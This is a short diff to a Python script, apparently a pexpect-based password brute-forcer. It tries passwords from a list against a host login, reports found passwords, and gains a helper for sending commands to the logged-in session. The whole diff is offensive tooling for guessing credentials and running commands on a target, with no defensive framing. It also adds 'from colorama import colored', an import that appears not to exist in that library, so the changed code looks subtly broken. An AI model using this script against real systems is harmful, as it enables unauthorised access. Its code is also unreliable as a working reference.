@@ -1,5 +1,6 @@
 #!/usr/bin/python
 import pexpect
+from colorama import colored
 
 #Author: Daniel Edwards
 #Date: 12/24/2019
@@ -8,6 +9,12 @@ import pexpect
 
 
 PROMPT = ['# ', '>>>', '>', '\\$']
+
+
+def send_command(child,command):
+	child.sendline(command)
+	child.expect(PROMPT)
+	print(child.before)
 
 
 def connect(user,host,password):
@@ -42,8 +49,9 @@ def main():
 		passwd = passwd.strip('\n')
 		try:
 			child = connect(user,host,passwd)
-			print('[+] Password Found: ' + passwd)
+			print(colored('[+] Password Found: ' + passwd, 'green'))
+
 		except:
-			print('Wrong Password: ' + passwd)
+			print(colored('Wrong Password: ' + passwd, 'red'))
 
 main()
